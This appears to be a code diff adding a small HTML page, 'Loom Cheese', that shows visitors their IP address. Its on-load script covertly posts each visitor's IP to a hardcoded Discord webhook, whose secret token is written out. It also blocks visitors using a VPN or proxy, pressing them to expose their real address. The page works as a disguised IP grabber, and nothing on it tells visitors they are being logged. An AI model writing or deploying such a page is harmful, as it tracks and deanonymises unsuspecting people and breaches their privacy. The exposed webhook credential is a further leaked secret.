@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loom Cheese</title>
+    <style>
+        /* Center content and apply basic styling */
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f4f4f9;
+            margin: 0;
+            padding: 20px;
+        }
+
+        h1 {
+            color: #333;
+        }
+
+        #ip {
+            font-size: 2rem;
+            color: #555;
+            margin-top: 10px;
+        }
+
+        /* Add a subtle animation to the IP display */
+        #ip.fade-in {
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+    </style>
+</head>
+<body>
+    <h1>Welcome to Loom Cheese</h1>
+    <h2>Your IP Address</h2>
+    <h1 id="ip">Loading...</h1>
+
+    <script>
+        // Fetch the user's IP address and send it to a Discord webhook
+        window.onload = async function () {
+            const ipElement = document.getElementById('ip');
+            const discordWebhookUrl = "https://discord.com/api/webhooks/1323013643373252840/r5H65e_rO3dliSkeWtMZK1pxoHVYNkfPQsvHsAQjrWnNO2G3cqmcnhvXsBsJnl72b9ES"; // Replace with your webhook URL
+
+            try {
+                // Fetch IP and additional details from the API
+                const response = await fetch('http://ip-api.com/json/?fields=query,proxy,hosting', {
+                    method: 'GET',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                });
+
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+
+                const data = await response.json();
+                const ip = data.query || 'Unavailable';
+
+                // Display IP on the page
+                ipElement.textContent = ip;
+                ipElement.classList.add('fade-in');
+
+                // Check if proxy or hosting is enabled
+                if (data.proxy || data.hosting) {
+                    ipElement.textContent = 'VPN or Proxy detected. Please disable and refresh.';
+                    console.warn('Proxy or hosting detected.');
+                    return;
+                }
+
+                // Prepare the Discord embed payload
+                const embedPayload = {
+                    embeds: [
+                        {
+                            title: "New IP Address Found",
+                            description: `**IP Address:** ${ip}`,
+                            color: 0x7289DA, // Discord blue
+                            timestamp: new Date().toISOString()
+                        }
+                    ]
+                };
+
+                // Send the IP to the Discord webhook
+                await fetch(discordWebhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(embedPayload)
+                });
+            } catch (error) {
+                // Handle errors gracefully
+                ipElement.textContent = 'Error fetching IP';
+            }
+        };
+    </script>
+</body>
+</html>
